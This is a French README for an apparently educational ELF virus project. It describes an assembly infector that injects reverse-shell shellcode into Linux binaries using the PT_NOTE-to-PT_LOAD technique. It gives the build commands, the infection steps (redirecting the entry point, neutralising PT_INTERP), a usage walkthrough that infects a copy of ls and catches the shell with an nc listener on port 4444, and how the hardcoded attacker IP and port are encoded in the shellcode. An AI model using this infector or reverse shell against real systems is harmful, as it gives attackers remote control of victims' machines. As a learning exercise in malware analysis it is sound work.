Arborescence : 

- infecteur.asm qui va analyser le binaire ELF et injecter un shellcode dans un binaire ELF

- reverseshell.asm c'est le shellcode reverseshell (connexion vers l'attaquant)

- Compilation

Infecteur :

nasm -f elf64 infecteur.asm -o infecteur.o
ld infecteur.o -o infecteur

Reverseshell :

nasm -f bin reverseshell.asm -o reverseshell.bin


Fonctionnement :

L'infecteur applique la technique PT_NOTE -> PT_LOAD :

1 - Trouve un segment PT_NOTE (ignoré à l'exécution)
2 - Le transforme en PT_LOAD exécutable
3 - Le fait pointer vers la fin du fichier (après le dernier LOAD et aligné sur 0x1000)
4 - Redirige e_entry vers ce segment
5 - Neutralise PT_INTERP (sinon ld-linux reprend la main et ignore e_entry)
6 - Append le shellcode à la fin du fichier

Au lancement du binaire infecté, le kernel saute directement sur le shellcode.

Utilisation :

1 - Copier le binaire cible (!!! ne jamais infecter l'original):
    cp /bin/ls ./test_ls

2 - Infecter :
    ./infecteur ./test_ls ./reverseshell.bin

3 - Sur la machine attaquante, écouter :
    nc -lvp 4444

4 - Lancer le binaire infecté :
       ./test_ls

5 - L'attaquant obtient un shell root sur la machine victime.

    Configuration du shellcode

    Dans reverseshell.asm, l'IP et le port de l'attaquant sont entrés dans :
    mov rbx, 0xc201a8c05c110002

    IP attaquant : c0 a8 01 c2 = 192.168.1.194 
    Port : 11 5c = 4444
    Ipv4 : 02 00 = AF_INET

    Pour changer d'IP/port, il faut reconstruire la valeur 64 bits.

Sources :

- Structure ELF : man 5 elf, /usr/include/elf.h
- Reverse shell x86-64 : https://www.exploit-db.com/exploits/42485
- Table des syscalls Linux x86-64 : https://syscalls.mebeim.net